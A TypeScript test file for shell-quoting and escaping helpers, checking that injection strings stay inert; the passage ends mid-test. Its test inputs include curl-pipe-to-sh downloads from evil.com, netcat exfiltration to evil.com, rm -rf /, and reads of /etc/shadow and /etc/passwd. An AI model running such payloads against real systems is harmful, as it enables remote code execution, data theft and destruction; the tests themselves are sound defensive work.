import * as assert from 'assert';
import { execSync } from 'child_process';
import { shellQuote, neutralizeCommandSubstitution, escapeShellArg } from "../shellEscaping";

// ──────────────────────────────────────────────────────────────────────────────
// Helper: evaluate a shellQuote'd string through /bin/sh and return the result.
// This is the ground-truth check — the shell itself tells us whether the
// quoting is correct and safe.
// ──────────────────────────────────────────────────────────────────────────────
function shellEval(quoted: string): string {
    return execSync(`printf '%s' ${quoted}`, { encoding: 'utf8', shell: '/bin/sh' });
}

// ════════════════════════════════════════════════════════════════════════════════
//  shellQuote
// ════════════════════════════════════════════════════════════════════════════════
export function runShellQuoteTests() {

    // ── Null / empty / falsy ─────────────────────────────────────────────────
    it('wraps empty string', () => {
        // Injection risk: an unquoted empty string vanishes in shell, potentially
        // shifting argument positions and causing unexpected command behaviour.
        assert.equal(shellQuote(''), "''");
    });

    it('wraps null', () => {
        // Same positional-shift risk as empty string.
        assert.equal(shellQuote(null), "''");
    });

    it('wraps undefined', () => {
        assert.equal(shellQuote(undefined), "''");
    });

    // ── Basic strings ────────────────────────────────────────────────────────
    it('wraps simple path', () => {
        assert.equal(shellQuote('/path/to/file'), "'/path/to/file'");
    });

    it('wraps path with spaces', () => {
        // Injection risk: without quoting, `cmd /path/with spaces/file` is parsed
        // as two arguments — the space causes word splitting that can alter the
        // command's behaviour or be leveraged for argument injection.
        assert.equal(shellQuote('/path/with spaces/file'), "'/path/with spaces/file'");
    });

    // ── Single-quote escaping ────────────────────────────────────────────────
    it('wraps and escapes single quotes', () => {
        // Injection risk: an embedded single quote can break out of quoting.
        // e.g. cmd 'it's here' → shell sees: cmd 'it' s here'
        // where `s` becomes a separate command/argument.
        assert.equal(shellQuote("it's here"), "'it'\\''s here'");
    });

    it('produces a shell-safe token for path with spaces and quotes', () => {
        // Combines both space word-splitting and quote-breakout vectors.
        assert.equal(shellQuote("/path/to/my files/it's here"), "'/path/to/my files/it'\\''s here'");
    });

    // ── BUG FIX: trailing single quote ───────────────────────────────────────
    // The original implementation appended an extra ' for inputs ending with ',
    // producing an unclosed single-quote that causes a shell syntax error.
    it('correctly handles input that is only a single quote', () => {
        // Injection risk: if a trailing quote produces invalid shell syntax, the
        // command may fail or behave unpredictably. The standard '\'' escaping
        // yields: ''\'''  (6 chars) which the shell parses as:
        // '' (empty) + \' (literal ') + '' (empty) = '
        const result = shellQuote("'");
        assert.equal(result, "''\\'''");
        assert.equal(shellEval(result), "'");
    });

    it('correctly handles input ending with a single quote', () => {
        // e.g. an attacker supplies filename "abc'" — the quote-breakout must be
        // handled so `cmd 'abc'\'''` is valid shell producing literal abc'
        const result = shellQuote("abc'");
        assert.equal(result, "'abc'\\'''");
        assert.equal(shellEval(result), "abc'");
    });

    it('correctly handles input with multiple trailing single quotes', () => {
        // Edge case: every consecutive trailing quote must be individually escaped
        // via '\'' without producing dangling unmatched quotes.
        const result = shellQuote("x''");
        assert.equal(shellEval(result), "x''");
    });

    it('correctly handles input that is multiple single quotes', () => {
        // Worst case: entire input is quotes — all must be escaped correctly.
        const result = shellQuote("'''");
        assert.equal(shellEval(result), "'''");
    });

    // ── Shell-verified injection prevention ──────────────────────────────────
    // These tests execute the quoted value through /bin/sh and verify the shell
    // treats the entire value as a single literal token.

    it('blocks command injection via single-quote breakout (shell-verified)', () => {
        // Attack: attacker supplies  '; rm -rf / #  as a filename.
        // Without proper escaping:  cmd ''; rm -rf / #'
        // Shell interprets: cmd '' (empty arg), then rm -rf / (destructive!), # comments out rest.
        const malicious = "'; rm -rf / #";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks command substitution $() (shell-verified)', () => {
        // Attack: attacker supplies $(echo pwned) as an argument.
        // Without quoting:  cmd $(echo pwned)  → shell executes echo pwned and
        // substitutes the output as an argument, enabling arbitrary code execution.
        const malicious = "$(echo pwned)";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks backtick substitution (shell-verified)', () => {
        // Attack: same as $() but with legacy backtick syntax.
        // Without quoting:  cmd `echo pwned`  → shell executes echo pwned.
        const malicious = "`echo pwned`";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks semicolon command chaining (shell-verified)', () => {
        // Attack: attacker supplies  file; echo pwned  as an argument.
        // Without quoting:  cmd file; echo pwned  → shell runs cmd file, then echo pwned.
        const malicious = "file; echo pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks pipe operator (shell-verified)', () => {
        // Attack: attacker supplies  file | cat /etc/passwd  as an argument.
        // Without quoting:  cmd file | cat /etc/passwd  → output of cmd is piped
        // to cat, leaking sensitive file contents.
        const malicious = "file | echo pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks && operator (shell-verified)', () => {
        // Attack: attacker supplies  file && echo pwned  as an argument.
        // Without quoting:  cmd file && echo pwned  → if cmd succeeds, echo runs.
        const malicious = "file && echo pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks || operator (shell-verified)', () => {
        // Attack: attacker supplies  file || echo pwned  as an argument.
        // Without quoting:  cmd file || echo pwned  → if cmd fails, echo runs.
        const malicious = "file || echo pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks output redirection (shell-verified)', () => {
        // Attack: attacker supplies  file > /tmp/pwned  as an argument.
        // Without quoting:  cmd file > /tmp/pwned  → cmd's stdout is redirected,
        // potentially overwriting arbitrary files on disk.
        const malicious = "file > /tmp/pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks input redirection (shell-verified)', () => {
        // Attack:  cmd file < /etc/passwd  → reads sensitive file as stdin.
        const malicious = "file < /etc/passwd";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks append redirection (shell-verified)', () => {
        // Attack:  cmd file >> /tmp/pwned  → appends output to arbitrary file.
        const malicious = "file >> /tmp/pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks background operator (shell-verified)', () => {
        // Attack:  cmd echo pwned &  → runs cmd in background, then executes
        // the next command, enabling attacker to run parallel processes.
        const malicious = "echo pwned &";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks newline injection (shell-verified)', () => {
        // Attack: attacker embeds a newline in the argument.
        // Without quoting:  cmd file\necho pwned  → shell treats the newline as
        // a command separator, executing echo pwned as a second command.
        const malicious = "file\necho pwned";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks subshell execution (shell-verified)', () => {
        // Attack:  cmd $(cat /etc/passwd)  → shell executes cat /etc/passwd
        // and substitutes its output, leaking file contents.
        const malicious = "$(cat /etc/passwd)";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks comment injection to truncate commands (shell-verified)', () => {
        // Attack:  cmd file # ignore rest  → the # causes the shell to treat
        // everything after as a comment, potentially truncating safety-critical
        // flags or arguments from the command line.
        const malicious = "file # ignore rest";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    // ── Special characters preserved literally ──────────────────────────────
    it('preserves backslashes literally (shell-verified)', () => {
        // Ensures Windows-style paths like C:\Users\admin\file are not
        // interpreted as escape sequences by the shell.
        const input = "C:\\Users\\admin\\file";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves double quotes literally (shell-verified)', () => {
        // Without quoting, double quotes change shell parsing mode and could
        // allow variable expansion or command substitution within them.
        const input = 'say "hello"';
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves dollar signs literally (shell-verified)', () => {
        // Without quoting, $HOME would be expanded to the user's home directory,
        // leaking environment information or altering command behaviour.
        const input = "$HOME/.config";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves glob characters literally (shell-verified)', () => {
        // Without quoting, *.txt triggers pathname expansion (globbing), which
        // can match unintended files or cause argument list injection.
        const input = "*.txt";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves question mark glob literally (shell-verified)', () => {
        // Without quoting, ? matches any single character in filenames.
        const input = "file?.log";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves bracket glob literally (shell-verified)', () => {
        // Without quoting, [0-9] matches any digit in filenames — bracket
        // expressions are expanded by the shell's pathname expansion.
        const input = "file[0-9].log";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves tilde literally (shell-verified)', () => {
        // Without quoting, ~/file expands ~ to $HOME, leaking the home
        // directory path and potentially targeting unintended file locations.
        const input = "~/file";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves exclamation mark literally (shell-verified)', () => {
        // In interactive bash, ! triggers history expansion (e.g. !rm re-runs
        // the last rm command). Must be treated as a literal.
        const input = "hello!world";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves tab characters literally (shell-verified)', () => {
        // Tabs act as word separators in unquoted shell context, splitting a
        // single argument into multiple arguments (word splitting).
        const input = "col1\tcol2";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves curly brace expansion literally (shell-verified)', () => {
        // Without quoting, {a,b,c} triggers brace expansion in bash, generating
        // three separate arguments: a b c.
        const input = "{a,b,c}";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('preserves parentheses literally (shell-verified)', () => {
        // Without quoting, (cmd) creates a subshell that executes cmd.
        const input = "(subshell)";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    // ── Unicode ──────────────────────────────────────────────────────────────
    it('handles unicode characters (shell-verified)', () => {
        // Ensures multi-byte UTF-8 characters are not corrupted or
        // misinterpreted during escaping.
        const input = "日本語/パス/ファイル";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    it('handles emoji (shell-verified)', () => {
        // 4-byte UTF-8 characters (emoji) must survive escaping intact.
        const input = "file_🚀_name";
        const result = shellQuote(input);
        assert.equal(shellEval(result), input);
    });

    // ── Compound / real-world attack payloads (shell-verified) ───────────────
    it('blocks multi-vector payload: quote breakout + command + redirect (shell-verified)', () => {
        // Attack: combines quote breakout, file exfiltration, and comment truncation.
        // cmd ''; cat /etc/shadow > /tmp/exfil #' → exfiltrates shadow password file.
        const malicious = "'; cat /etc/shadow > /tmp/exfil #";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks nested substitution payload (shell-verified)', () => {
        // Attack: nested command substitution — backticks inside $().
        // cmd $(echo `cat /etc/passwd`) → executes cat, passes output to echo,
        // then substitutes into the command line.
        const malicious = "$(echo `cat /etc/passwd`)";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks payload with newline and semicolons (shell-verified)', () => {
        // Attack: newline acts as command separator, then semicolon chains
        // a curl|sh payload to download and execute arbitrary code.
        const malicious = "clean\n; curl http://evil.com/shell.sh | sh";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks here-string redirection attack (shell-verified)', () => {
        // Attack: <<< is bash's here-string operator; combined with $(whoami)
        // it can feed command output into another program's stdin.
        const malicious = "<<< $(whoami)";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('blocks file descriptor redirection attack (shell-verified)', () => {
        // Attack: 2>&1 | tee /tmp/leaked → redirects stderr to stdout, then
        // pipes combined output to tee, writing a copy to disk (data exfiltration).
        const malicious = "2>&1 | tee /tmp/leaked";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });

    it('handles kitchen-sink payload (shell-verified)', () => {
        // Attack: combines every major injection vector in a single payload:
        // quote breakout, $() substitution, backtick substitution, pipe, background
        // operator, redirection, semicolon chaining, double-quote context, and comment.
        const malicious = "'; $(rm -rf /) `reboot` | cat & > /dev/null ; echo \"pwned\" #";
        const result = shellQuote(malicious);
        assert.equal(shellEval(result), malicious);
    });
}

// ════════════════════════════════════════════════════════════════════════════════
//  neutralizeCommandSubstitution
// ════════════════════════════════════════════════════════════════════════════════
export function runNeutralizeCommandSubstitutionTests() {

    // ── Null / empty / falsy ─────────────────────────────────────────────────
    it('returns null unchanged', () => {
        assert.equal(neutralizeCommandSubstitution(null), null);
    });

    it('returns undefined unchanged', () => {
        assert.equal(neutralizeCommandSubstitution(undefined), undefined);
    });

    it('returns empty string unchanged', () => {
        assert.equal(neutralizeCommandSubstitution(''), '');
    });

    // ── Pass-through (no dangerous content) ──────────────────────────────────
    it('returns simple string unchanged', () => {
        assert.equal(neutralizeCommandSubstitution('--flag=value'), '--flag=value');
    });

    it('preserves $VAR', () => {
        // $VAR is a plain variable expansion, not command substitution.
        // Must be preserved so that legitimate env var references still work.
        assert.equal(neutralizeCommandSubstitution('$HOME'), '$HOME');
    });

    it('preserves ${VAR}', () => {
        // ${VAR} is brace-delimited variable expansion — safe, must be preserved.
        assert.equal(neutralizeCommandSubstitution('${HOME}'), '${HOME}');
    });

    it('preserves ${VAR} brace-expansion (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}/${USER}'), '${HOME}/${USER}');
    });

    it('preserves bare dollar followed by letter (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME $PATH $1'), '$HOME $PATH $1');
    });

    it('handles real cmake args with env vars', () => {
        // Real-world use case: cmake configure flags referencing env vars.
        assert.equal(
            neutralizeCommandSubstitution('.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'),
            '.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'
        );
    });

    // ── Command substitution (existing coverage) ─────────────────────────────
    it('escapes backtick substitution', () => {
        // Attack: `whoami` → shell executes whoami and substitutes output.
        // e.g. cmake -DUSER=`whoami` → leaks the current username into the build.
        assert.equal(neutralizeCommandSubstitution('`whoami`'), '\\`whoami\\`');
    });

    it('escapes $() substitution', () => {
        // Attack: $(id) → shell executes id command.
        // e.g. cmake -DFLAG=$(id) → executes id, substitutes uid/gid info.
        assert.equal(neutralizeCommandSubstitution('$(id)'), '\\$(id)');
    });

    it('handles mixed content preserving env vars', () => {
        // Attack: -DFOO=$(curl evil.com) injects a curl call while -DBAR=${ENV_VAR}
        // is a legitimate env var reference that must be preserved.
        assert.equal(
            neutralizeCommandSubstitution('-DFOO=$(curl evil.com) -DBAR=${ENV_VAR}'),
            '-DFOO=\\$(curl evil.com) -DBAR=${ENV_VAR}'
        );
    });

    it('escapes nested substitution', () => {
        // Attack: $(echo `whoami`) — nested backtick inside $() substitution.
        // Shell evaluates inner backtick first, then outer $().
        assert.equal(
            neutralizeCommandSubstitution('$(echo `whoami`)'),
            '\\$(echo \\`whoami\\`)'
        );
    });

    it('blocks real attack payload', () => {
        // Attack: cmake flag with curl|sh payload — downloads and executes
        // arbitrary code from an attacker-controlled server.
        const payload = '.. -DFOO=$(curl http://evil.com/payload.sh | sh)';
        const result = neutralizeCommandSubstitution(payload);
        assert.equal(result, '.. -DFOO=\\$(curl http://evil.com/payload.sh | sh)');
    });

    // ── Backslash handling ───────────────────────────────────────────────────
    it('escapes existing backslashes before backticks to prevent backslash consumption', () => {
        // Edge case: input has a literal \` — the existing \ must be escaped first
        // so the added \ for backtick escaping doesn't combine with it, leaving
        // the backtick unescaped. Without this: \` + \` → \\` (backslash consumed,
        // backtick exposed).
        assert.equal(neutralizeCommandSubstitution('\\`cmd`'), '\\\\\\`cmd\\`');
    });

    it('escapes standalone backslashes', () => {
        // Backslashes must be escaped first to prevent them from acting as escape
        // characters for subsequent metacharacter escaping.
        assert.equal(neutralizeCommandSubstitution('a\\b'), 'a\\\\b');
    });

    // ══════════════════════════════════════════════════════════════════════════
    //  NEW: Injection vectors NOT currently handled
    //  These tests document the full set of shell metacharacter attacks that
    //  neutralizeCommandSubstitution must also block for complete CWE-78 coverage.
    // ══════════════════════════════════════════════════════════════════════════

    // ── Semicolons (command separator) ───────────────────────────────────────
    it('escapes semicolons to prevent command chaining', () => {
        // Attack: cmake -DFOO=bar; rm -rf / → the semicolon terminates the cmake
        // command and rm -rf / executes as a separate command, destroying the filesystem.
        const input = '-DFOO=bar; rm -rf /';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.includes(';') || result.includes('\\;'),
            `Semicolons must be escaped or removed. Got: ${result}`);
    });

    it('escapes semicolons in cmake-like context', () => {
        // Attack: cmake -DCMAKE_C_FLAGS=-O2; curl evil.com | sh → terminates cmake,
        // then downloads and executes a remote script.
        const input = '.. -DCMAKE_C_FLAGS=-O2; curl evil.com | sh';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\);/),
            `Unescaped semicolon found. Got: ${result}`);
    });

    // ── Pipes (command chaining) ─────────────────────────────────────────────
    it('escapes pipe operator to prevent command piping', () => {
        // Attack: cmd file | cat /etc/passwd → pipes cmd output to cat, which reads
        // and displays the password file. Enables data exfiltration.
        const input = 'file | cat /etc/passwd';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\|/),
            `Unescaped pipe found. Got: ${result}`);
    });

    // ── AND / OR operators ───────────────────────────────────────────────────
    it('escapes && to prevent conditional command execution', () => {
        // Attack: true && echo pwned → if the first command succeeds, the second
        // command executes. Enables conditional arbitrary code execution.
        const input = 'true && echo pwned';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)&&/),
            `Unescaped && found. Got: ${result}`);
    });

    it('escapes || to prevent fallback command execution', () => {
        // Attack: false || echo pwned → if the first command fails, the second
        // executes. Enables fallback arbitrary code execution.
        const input = 'false || echo pwned';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\|\|/),
            `Unescaped || found. Got: ${result}`);
    });

    // ── Redirections ─────────────────────────────────────────────────────────
    it('escapes output redirection >', () => {
        // Attack: cmd data > /tmp/stolen → redirects output to a file, enabling
        // an attacker to overwrite arbitrary files (e.g. cron jobs, SSH keys).
        const input = 'data > /tmp/stolen';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)>/),
            `Unescaped > found. Got: ${result}`);
    });

    it('escapes append redirection >>', () => {
        // Attack: cmd data >> /tmp/stolen → appends output to a file, enabling
        // persistent data exfiltration or log poisoning.
        const input = 'data >> /tmp/stolen';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)>>/),
            `Unescaped >> found. Got: ${result}`);
    });

    it('escapes input redirection <', () => {
        // Attack: cmd < /etc/passwd → feeds the password file as stdin to cmd,
        // potentially leaking its contents through cmd's output.
        const input = 'cmd < /etc/passwd';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)</),
            `Unescaped < found. Got: ${result}`);
    });

    it('escapes file descriptor redirection 2>&1', () => {
        // Attack: cmd 2>&1 | tee /tmp/log → merges stderr into stdout, then
        // pipes to tee which writes a copy to disk (captures error messages
        // that may contain secrets, tokens, or paths).
        const input = 'cmd 2>&1 | tee /tmp/log';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)>/),
            `Unescaped > in fd redirection. Got: ${result}`);
    });

    // ── Newlines (command separator) ─────────────────────────────────────────
    it('escapes newlines to prevent multi-line command injection', () => {
        // Attack: -DFOO=bar\necho pwned → the newline acts as a command separator
        // in shell, so echo pwned executes as a separate command on the next line.
        const input = '-DFOO=bar\necho pwned';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.includes('\n'),
            `Unescaped newline found. Got: ${JSON.stringify(result)}`);
    });

    it('escapes carriage return + newline', () => {
        // Attack: same as newline injection but with Windows-style line endings.
        // \r\n is treated as a newline by most shells.
        const input = '-DFOO=bar\r\necho pwned';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.includes('\n') && !result.includes('\r'),
            `Unescaped CR/LF found. Got: ${JSON.stringify(result)}`);
    });

    // ── Background operator ──────────────────────────────────────────────────
    it('escapes background operator &', () => {
        // Attack: echo pwned & → the & sends the preceding command to background
        // and allows the shell to continue executing subsequent commands. Can be
        // combined with other payloads to run multiple malicious processes.
        const input = 'echo pwned &';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)&/),
            `Unescaped & found. Got: ${result}`);
    });

    // ── Process substitution (bash-specific) ─────────────────────────────────
    it('escapes process substitution <()', () => {
        // Attack: diff <(cat /etc/passwd) file → <() creates a named pipe fed by
        // cat /etc/passwd, enabling an attacker to read sensitive files by making
        // them appear as regular file arguments.
        const input = '<(cat /etc/passwd)';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)<\(/),
            `Unescaped <() found. Got: ${result}`);
    });

    it('escapes process substitution >()', () => {
        // Attack: cmd >(tee /tmp/stolen) → >() creates a named pipe that writes
        // cmd's output through tee to a file, enabling data exfiltration.
        const input = '>(tee /tmp/stolen)';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)>\(/),
            `Unescaped >() found. Got: ${result}`);
    });

    // ── Subshell ─────────────────────────────────────────────────────────────
    it('escapes subshell parentheses', () => {
        // Attack: (echo pwned) → parentheses create a subshell that executes
        // the enclosed command. In some contexts this enables code execution
        // even when other operators are filtered.
        const input = '(echo pwned)';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\(/) || !result.match(/(?<!\\)\)/),
            `Unescaped parentheses found. Got: ${result}`);
    });

    // ── Comment character ────────────────────────────────────────────────────
    it('escapes hash to prevent comment truncation', () => {
        // Attack: cmd value # ignore rest → the # causes the shell to treat
        // everything after as a comment, silently dropping safety-critical flags
        // or arguments. e.g. cmake -DSECURE=ON # -DDEBUG=OFF → debug stays on.
        const input = 'value # ignore the rest of the command';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)#/),
            `Unescaped # found. Got: ${result}`);
    });

    // ── Compound payloads ────────────────────────────────────────────────────
    it('neutralizes multi-vector payload: semicolons + substitution + redirection', () => {
        // Attack: combines $(whoami) command substitution, ; to chain commands,
        // and > to exfiltrate /etc/shadow to a file.
        const input = '-DFOO=$(whoami); cat /etc/shadow > /tmp/exfil';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\$\(/), `Unescaped $( found`);
        assert.ok(!result.match(/(?<!\\);/), `Unescaped ; found`);
        assert.ok(!result.match(/(?<!\\)>/), `Unescaped > found`);
    });

    it('neutralizes pipe + background + newline compound attack', () => {
        // Attack: pipes data to nc (netcat) for exfiltration over network,
        // backgrounds it with &, then injects another command via newline.
        const input = 'val | nc evil.com 1234 &\necho done';
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\|/), `Unescaped | found`);
        assert.ok(!result.match(/(?<!\\)&/), `Unescaped & found`);
        assert.ok(!result.includes('\n'), `Unescaped newline found`);
    });

    it('neutralizes kitchen-sink payload', () => {
        // Attack: combines every major injection vector — $() substitution,
        // backtick substitution, pipe, background &, redirection >, semicolon
        // chaining, comment truncation #, and newline command separator.
        const input = "$(rm -rf /) `reboot` | cat & > /dev/null ; echo pwned # comment\nnewline";
        const result = neutralizeCommandSubstitution(input);
        assert.ok(!result.match(/(?<!\\)\$\(/), `Unescaped $( found`);
        assert.ok(!result.match(/(?<!\\)`/), `Unescaped backtick found`);
        assert.ok(!result.match(/(?<!\\)\|/), `Unescaped | found`);
        assert.ok(!result.match(/(?<!\\)&/), `Unescaped & found`);
        assert.ok(!result.match(/(?<!\\)>/), `Unescaped > found`);
        assert.ok(!result.match(/(?<!\\);/), `Unescaped ; found`);
        assert.ok(!result.match(/(?<!\\)#/), `Unescaped # found`);
        assert.ok(!result.includes('\n'), `Unescaped newline found`);
    });

    // ── Preservation regression: safe content must still pass through ─────────
    it('still preserves $VAR after adding metachar escaping', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME'), '$HOME');
    });

    it('still preserves ${VAR} after adding metachar escaping', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}'), '${HOME}');
    });

    it('still preserves simple flags after adding metachar escaping', () => {
        assert.equal(neutralizeCommandSubstitution('--flag=value'), '--flag=value');
    });

    it('still preserves cmake args with env vars after adding metachar escaping', () => {
        assert.equal(
            neutralizeCommandSubstitution('.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'),
            '.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'
        );
    });
}

// ════════════════════════════════════════════════════════════════════════════════
//  escapeShellArg — comprehensive shell argument escaping
//  This function should escape ALL shell metacharacters for use in unquoted
//  contexts, providing full CWE-78 protection without wrapping in quotes.
//  It is intended for cases where single-quoting (shellQuote) is not suitable
//  (e.g., when env var expansion must be preserved).
// ════════════════════════════════════════════════════════════════════════════════
export function runEscapeShellArgTests() {

    // ── Null / empty / falsy ─────────────────────────────────────────────────
    it('returns null unchanged', () => {
        assert.equal(escapeShellArg(null), null);
    });

    it('returns undefined unchanged', () => {
        assert.equal(escapeShellArg(undefined), undefined);
    });

    it('returns empty string unchanged', () => {
        assert.equal(escapeShellArg(''), '');
    });

    // ── Pass-through (no special chars) ──────────────────────────────────────
    it('passes through simple alphanumeric string', () => {
        assert.equal(escapeShellArg('hello'), 'hello');
    });

    it('passes through simple path', () => {
        assert.equal(escapeShellArg('/usr/bin/gcc'), '/usr/bin/gcc');
    });

    it('passes through flags', () => {
        assert.equal(escapeShellArg('--flag=value'), '--flag=value');
    });

    it('passes through $VAR env references', () => {
        // $VAR must be preserved so the shell can expand environment variables.
        assert.equal(escapeShellArg('$HOME'), '$HOME');
    });

    it('passes through ${VAR} env references', () => {
        // ${VAR} brace-delimited env var must also be preserved.
        assert.equal(escapeShellArg('${HOME}'), '${HOME}');
    });

    // ── Single characters that must be escaped ───────────────────────────────
    it('escapes semicolon', () => {
        // Attack: cmd arg; malicious_cmd → ; terminates arg and runs malicious_cmd.
        const result = escapeShellArg(';');
        assert.equal(result, '\\;');
    });

    it('escapes pipe', () => {
        // Attack: cmd arg | exfil_cmd → pipes output to attacker's command.
        const result = escapeShellArg('|');
        assert.equal(result, '\\|');
    });

    it('escapes ampersand', () => {
        // Attack: cmd arg & malicious_cmd → backgrounds cmd, runs malicious_cmd.
        const result = escapeShellArg('&');
        assert.equal(result, '\\&');
    });

    it('escapes greater-than', () => {
        // Attack: cmd arg > /tmp/pwned → redirects output, overwrites files.
        const result = escapeShellArg('>');
        assert.equal(result, '\\>');
    });

    it('escapes less-than', () => {
        // Attack: cmd arg < /etc/passwd → reads sensitive file as stdin.
        const result = escapeShellArg('<');
        assert.equal(result, '\\<');
    });

    it('escapes backtick', () => {
        // Attack: cmd `malicious_cmd` → shell executes malicious_cmd and
        // substitutes its output into the command line.
        const result = escapeShellArg('`');
        assert.equal(result, '\\`');
    });

    it('escapes open paren', () => {
        // Attack: (malicious_cmd) → creates a subshell executing malicious_cmd.
        const result = escapeShellArg('(');
        assert.equal(result, '\\(');
    });

    it('escapes close paren', () => {
        // Paired with open paren for subshell injection.
        const result = escapeShellArg(')');
        assert.equal(result, '\\)');
    });

    it('escapes hash', () => {
        // Attack: cmd arg # rest → # comments out the rest of the line, silently
        // dropping subsequent arguments or flags.
        const result = escapeShellArg('#');
        assert.equal(result, '\\#');
    });

    it('escapes newline', () => {
        // Attack: cmd arg\nmalicious_cmd → newline acts as command separator,
        // executing malicious_cmd on the next line.
        const result = escapeShellArg('\n');
        assert.ok(!result.includes('\n'),
            `Newline must be escaped or removed. Got: ${JSON.stringify(result)}`);
    });

    it('escapes carriage return', () => {
        // Attack: same as newline but with \r (can also cause terminal escape issues).
        const result = escapeShellArg('\r');
        assert.ok(!result.includes('\r'),
            `Carriage return must be escaped or removed. Got: ${JSON.stringify(result)}`);
    });

    it('escapes single quote', () => {
        // Attack: cmd 'arg' → unescaped quotes change shell quoting context,
        // enabling breakout from intended quoting.
        const result = escapeShellArg("'");
        assert.equal(result, "\\'");
    });

    it('escapes double quote', () => {
        // Attack: cmd "arg" → double quotes enable variable expansion and
        // command substitution within them.
        const result = escapeShellArg('"');
        assert.equal(result, '\\"');
    });

    it('escapes backslash', () => {
        // Backslashes are escape characters in shell — an unescaped backslash
        // can consume the escaping of subsequent metacharacters.
        const result = escapeShellArg('\\');
        assert.equal(result, '\\\\');
    });

    it('escapes space', () => {
        // Attack: cmd two words → space causes word splitting, changing argument
        // count and potentially shifting arguments to different positions.
        const result = escapeShellArg(' ');
        assert.equal(result, '\\ ');
    });

    it('escapes tab', () => {
        // Tabs also cause word splitting like spaces.
        const result = escapeShellArg('\t');
        assert.equal(result, '\\\t');
    });

    it('escapes exclamation mark', () => {
        // Attack: in interactive bash, ! triggers history expansion.
        // e.g. !rm re-runs the last rm command.
        const result = escapeShellArg('!');
        assert.equal(result, '\\!');
    });

    it('escapes glob asterisk', () => {
        // Attack: cmd *.txt → * triggers pathname expansion, matching all .txt
        // files, potentially including sensitive files as arguments.
        const result = escapeShellArg('*');
        assert.equal(result, '\\*');
    });

    it('escapes glob question mark', () => {
        // Attack: cmd file?.log → ? matches any single character, causing
        // unintended file matches via pathname expansion.
        const result = escapeShellArg('?');
        assert.equal(result, '\\?');
    });

    it('escapes open bracket', () => {
        // Attack: cmd file[0-9] → bracket expressions in globbing match character
        // ranges, enabling unintended file access.
        const result = escapeShellArg('[');
        assert.equal(result, '\\[');
    });

    it('escapes close bracket', () => {
        // Paired with open bracket for glob range injection.
        const result = escapeShellArg(']');
